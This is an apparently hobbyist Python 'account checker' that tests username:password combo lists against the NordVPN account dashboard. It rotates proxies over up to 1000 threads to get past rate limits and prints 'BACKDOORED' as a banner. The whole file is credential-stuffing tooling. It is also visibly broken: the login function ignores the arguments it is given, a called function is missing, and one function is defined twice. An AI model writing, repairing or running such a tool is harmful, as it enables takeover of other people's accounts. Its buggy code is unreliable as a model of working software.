import os
import json
import requests
from colorama import init, Fore
from bs4 import BeautifulSoup
from multiprocessing.dummy import Pool
import pyfiglet

# Initialize Colorama
init(autoreset=True)

import io

def display_ascii_art(file_path):
    with io.open(file_path, 'r', encoding='utf-8') as art_file:
        ascii_art = art_file.read()
        print(Fore.MAGENTA + ascii_art)

def print_menu():
    print(Fore.MAGENTA + "[1] Config")
    print("[2] Multi-threading")
    print("[3] Start")
    print("[4] Exit")

def config_menu(config):
    if 'proxies_file' in config:
        print("Current configuration:")
        print(f"Proxies file: {config['proxies_file']}")
        print(f"Userpass file: {config['userpass_file']}")
    else:
        print("No configuration found.")
    print("\nSelect an option:")
    print("[1] Edit proxies file path")
    print("[2] Edit userpass file path")
    print("[3] Back to main menu")

    choice = input()

    if choice == "1":
        new_path = input("Enter the new path for the proxies file: ")
        config['proxies_file'] = new_path
        save_config(config)
    elif choice == "2":
        new_path = input("Enter the new path for the userpass file: ")
        config['userpass_file'] = new_path
        save_config(config)
    elif choice == "3":
        pass
    else:
        print("Invalid choice. Please select a valid option.")
        config_menu(config)

def edit_config_json(config):
    with open('config.json', 'w') as config_file:
        json.dump(config, config_file, indent=4)

def save_config(config):
    with open('config.json', 'w') as config_file:
        json.dump(config, config_file, indent=4)
        
def threading_menu(config):
    try:
        num_threads = int(input("Enter the number of threads (up to 1000): "))
        if num_threads < 1 or num_threads > 1000:
            print("Invalid number of threads. Please choose a value between 1 and 1000.")
        else:
            start_multithreaded_process(config, num_threads)
    except ValueError:
        print("Invalid input. Please enter a valid number.")

def start_multithreaded_process(config, num_threads):
    with open(config['proxies_file'], 'r') as proxies_file:
        proxies = proxies_file.readlines()

    with open(config['userpass_file'], 'r') as userpass_file:
        userpass = userpass_file.readlines()

    if not os.path.isfile(config['proxies_file']) or not os.path.isfile(config['userpass_file']):
        print("Error: Proxies file or userpass file not found. Please provide valid paths in the config.")
        return

    pool = Pool(num_threads)
    pool.starmap(proxy_login, [(proxy.strip(), up.strip()) for proxy in proxies for up in userpass])

def proxy_login():
    proxies_file = open('proxies.txt', 'r')
    proxies = proxies_file.readlines()

    userpass_file = open('userpass.txt', 'r')
    userpass = userpass_file.readlines()

    for proxy in proxies:
        with requests.Session() as session:
            for up in userpass:
                # Split username and password
                username, password = up.strip().split(':')

                # Set up request session with proxy and authentication
                session.proxies = {
                    'http': f'http://{proxy}',
                    'https': f'https://{proxy}'
                }
                session.auth = (username, password)

                url = 'https://my.nordaccount.com/dashboard'
                response = session.get(url)

                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    if soup.find('title').text == 'Nord Account Dashboard':
                        print(f'Successful login for {username}')
                    else:
                        print(f'Failed login for {username}')
                else:
                    print(f'Failed request for {username} with proxy {proxy}')


def save_config(config):
    with open('config.json', 'w') as config_file:
        json.dump(config, config_file, indent=4)

def main():
    os.system("cls" if os.name == "nt" else "clear")
    
    with open('C:\\Users\\Steal\\OneDrive\\Documents\\MT\\ACC CHECKERS\\Nord Acc Checker\\art.txt', 'r', encoding='utf-8') as art_file:
        ascii_art = art_file.read()
        print(Fore.MAGENTA + ascii_art)

    f = pyfiglet.Figlet(font='alligator')
    backdoor_text = f.renderText("BACKDOORED")
    print(Fore.MAGENTA + backdoor_text)

    config = {
        "proxies_file": "proxies.txt",
        "userpass_file": "userpass.txt"
    }

    while True:
        print_menu()
        choice = input("Select an option: ")

        if choice == "1":
            config_menu(config)
        elif choice == "2":
            threading_menu(config)
        elif choice == "3":
            start_process(config)
        elif choice == "4":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()